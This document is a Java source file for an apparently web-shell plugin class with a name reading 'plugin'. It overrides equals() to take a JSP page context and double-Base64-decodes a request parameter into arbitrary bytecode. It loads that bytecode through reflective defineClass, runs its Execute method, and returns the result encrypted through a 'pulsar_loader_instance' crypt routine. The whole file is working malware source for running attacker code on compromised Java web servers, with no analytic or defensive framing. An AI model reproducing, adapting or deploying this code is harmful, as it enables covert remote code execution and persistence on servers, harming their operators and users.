import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class plugin extends ClassLoader
{
    public plugin(ClassLoader objParent) { super(objParent); }
    public plugin() { super(plugin.class.getClassLoader()); }

    private Map<String, String> fnParseParams(String szParamStr)
    {
        Map<String, String> mapParams = new HashMap<String, String>();
        if (szParamStr == null || szParamStr.trim().isEmpty())
            return mapParams;

        String[] aszPairs = szParamStr.split("&");
        for (String szPair : aszPairs)
        {
            int nIdx = szPair.indexOf("=");
            if (nIdx > 0)
            {
                mapParams.put(szPair.substring(0, nIdx), szPair.substring(nIdx + 1));
            }
        }
        return mapParams;
    }

    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
    {
        if (abResult.length == 0)
            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();

        Object objPageContext = objParam;

        try
        {
            byte[] abEncryptedResult = Encrypt(objParam, abResult);
            osClient.write(abEncryptedResult);
            osClient.flush();

            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
            fnSetStatus.invoke(objResponse, new Object[]{200});

            try
            {
                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
                fnClear.invoke(objOut, new Object[0]);
            }
            catch (Exception exIgnored) {}

            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
            fnFlushBuffer.invoke(objResponse, new Object[0]);
        }
        catch (Exception exIgnored) {}
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
    {
        try
        {
            if (objPageContext == null)
                return abRawResponse;

            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
            
            if (objPulsarLoader == null)
                return abRawResponse;

            java.lang.reflect.Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
            fnCrypt.setAccessible(true);

            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
        }
        catch (Exception exCrashed)
        {
            return abRawResponse;
        }
    }

    @Override
    public boolean equals(Object objParam)
    {
        Object objPageContext = objParam;
        Object objRequest = null;
        Object objResponse = null;
        OutputStream osClient = null;

        try
        {
            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);

            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPayload = fnGetAttribute.invoke(objRequest, new Object[]{"payload"});
            Object objLength = fnGetAttribute.invoke(objRequest, new Object[]{"len"});

            if (objPayload == null || objLength == null)
            {
                osClient.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                return true;
            }

            byte[] abPayload = (byte[])objPayload;
            int nClassLength = Integer.parseInt(objLength.toString());
            int nParamOffset = nClassLength + 4;
            int nParamLength = abPayload.length - nParamOffset;
            String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();

            Map<String, String> mapParams = fnParseParams(szParam);
            StringBuffer sb = new StringBuffer();

            String z0 = mapParams.get("z0");
            String z1 = mapParams.get("z1");

            try
            {
                byte[] firstDecode = Base64.getDecoder().decode(z0);
                byte[] abBuffer = Base64.getDecoder().decode(firstDecode);
                
                String szJson = "";
                if (z1 != null && !z1.trim().isEmpty()) {
                    String sanitizedZ1 = URLDecoder.decode(z1, "UTF-8");
                    byte[] jsonBytes = Base64.getDecoder().decode(sanitizedZ1);
                    szJson = new String(jsonBytes, "UTF-8");
                }

                ClassLoader parentCl = Thread.currentThread().getContextClassLoader();
                ClassLoader cl = null;

                try {
                    java.lang.reflect.Constructor<java.security.SecureClassLoader> constructor = 
                        java.security.SecureClassLoader.class.getDeclaredConstructor(ClassLoader.class);
                    constructor.setAccessible(true);
                    cl = constructor.newInstance(parentCl);
                } catch (Exception exClassLoader) {
                    java.lang.reflect.Constructor<ClassLoader> constructor = 
                        ClassLoader.class.getDeclaredConstructor(ClassLoader.class);
                    constructor.setAccessible(true);
                    cl = constructor.newInstance(parentCl);
                }

                java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(
                    "defineClass", 
                    new Class[]{String.class, byte[].class, int.class, int.class}
                );
                defineClassMethod.setAccessible(true);
                
                Class<?> clazz = (Class<?>) defineClassMethod.invoke(
                    cl, 
                    new Object[]{null, abBuffer, 0, abBuffer.length}
                );
                
                Object targetInstance = clazz.getDeclaredConstructor().newInstance();
                Map<String, Object> execParams = new HashMap<>();
                execParams.put("context", objParam);
                execParams.put("json", szJson);

                java.lang.reflect.Method execMethod = clazz.getMethod("Execute", new Class[]{Object.class});
                Object resultObj = execMethod.invoke(targetInstance, new Object[]{execParams});
                
                byte[] resultBytes;
                if (resultObj != null) {
                    resultBytes = resultObj.toString().getBytes("UTF-8");
                } else {
                    resultBytes = new byte[0];
                }

                fnWriteOutput(objParam, objResponse, osClient, resultBytes);

                cl = null;
                clazz = null;
                targetInstance = null;

                return true;
            }
            catch (Exception ex)
            {
                Throwable cause = ex;
                if (ex instanceof java.lang.reflect.InvocationTargetException) {
                    cause = ((java.lang.reflect.InvocationTargetException) ex).getTargetException();
                }
                sb.append("Error during plugin execution: ").append(cause.toString());
                
                java.io.StringWriter sw = new java.io.StringWriter();
                java.io.PrintWriter pw = new java.io.PrintWriter(sw);
                cause.printStackTrace(pw);
                sb.append("\nStacktrace:\n").append(sw.toString());
            }

            fnWriteOutput(objParam, objResponse, osClient, sb.toString().getBytes());
        }
        catch (Exception ex) {}

        return true;
    }
}